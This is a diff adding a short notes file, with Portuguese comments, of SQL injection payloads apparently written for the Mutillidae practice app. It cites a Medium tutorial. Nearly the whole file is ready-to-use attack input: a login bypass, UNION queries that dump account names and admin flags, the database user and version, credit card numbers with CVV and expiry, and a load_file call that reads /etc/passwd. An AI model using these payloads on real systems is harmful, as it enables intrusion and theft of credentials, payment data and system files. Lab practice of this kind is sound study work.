@@ -1,0 +1,19 @@
+### SQL INJECTION QUERIES ###
+
+https://tanvitrivedi.medium.com/sql-injection-in-mutillidae-af0411367949
+
+#' or 1=1 -- # - Detalhes das contas
+
+#admin'# # -- User admin
+
+#'union select null,cid,username,is_admin,null,null,null from accounts -- # Todos as senhas 
+
+#'union select null,user(),null,null,null,null,null -- # - Usuário Logado no momento
+
+#'union select null,@@version,null,null,null,null,null -- # - Versão do Sistema
+
+## - Nome do Database
+
+#' union select ccid,ccnumber,ccv,expiration,null,null,null from credit_cards -- # - Informações de cartao de credito
+
+#admin' union select null,load_file('/etc/passwd'),null,null,null,null,null -- # -- Carrega informações do /etc/passwd -***
